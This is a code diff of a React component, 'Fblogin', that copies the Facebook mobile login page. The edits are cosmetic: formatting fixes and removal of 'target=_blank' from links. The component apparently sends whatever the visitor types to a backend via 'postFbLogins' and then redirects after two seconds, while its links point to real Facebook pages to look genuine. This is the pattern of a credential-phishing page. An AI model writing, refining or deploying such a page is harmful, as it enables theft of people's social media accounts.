@@ -25,13 +25,12 @@ export const Fblogin = () => {
     const { name, value } = e.target;
     setId({ ...id, [name]: value });
   };
-  const handleOnSubmit =async (e) => {
+  const handleOnSubmit = async (e) => {
     e.preventDefault();
-    const result = await postFbLogins(id)
-      window.setTimeout(() => {
-        navigate("facebooklogin");
-      }, 2000);
-    
+    const result = await postFbLogins(id);
+    window.setTimeout(() => {
+      navigate("facebooklogin");
+    }, 2000);
   };
 
   return (
@@ -115,7 +114,6 @@ export const Fblogin = () => {
                 href="https://m.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Frefsrc%3Ddeprecated&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&_rdr"
                 className="forgotten_password__link"
                 variant="primary"
-                target="_blank"
               >
                 Forgotten password?
               </a>
@@ -136,7 +134,6 @@ export const Fblogin = () => {
             <Button variant="success" className="create_new__account">
               <a
                 href="https://m.facebook.com/reg/?cid=103&refsrc=deprecated&soft=hjk"
-                target="_blank"
                 className="dead_link"
               >
                 Create New Account
@@ -146,11 +143,7 @@ export const Fblogin = () => {
         </Row>
         <Row className="text-center mt-5 footer_list">
           <Col>
-            <a
-              href="https://about.meta.com/"
-              className="dead_link"
-              target="_blank"
-            >
+            <a href="https://about.meta.com/" className="dead_link">
               About
             </a>
           </Col>
@@ -158,7 +151,6 @@ export const Fblogin = () => {
             <a
               href="https://www.facebook.com/help?_rdc=1&_rdr"
               className="dead_link"
-              target="_blank"
             >
               Help
             </a>
@@ -167,7 +159,6 @@ export const Fblogin = () => {
             <a
               href="https://web.facebook.com/privacy/policy/?entry_point=facebook_page_footer"
               className="dead_link"
-              target="_blank"
             >
               Privacy policy
             </a>
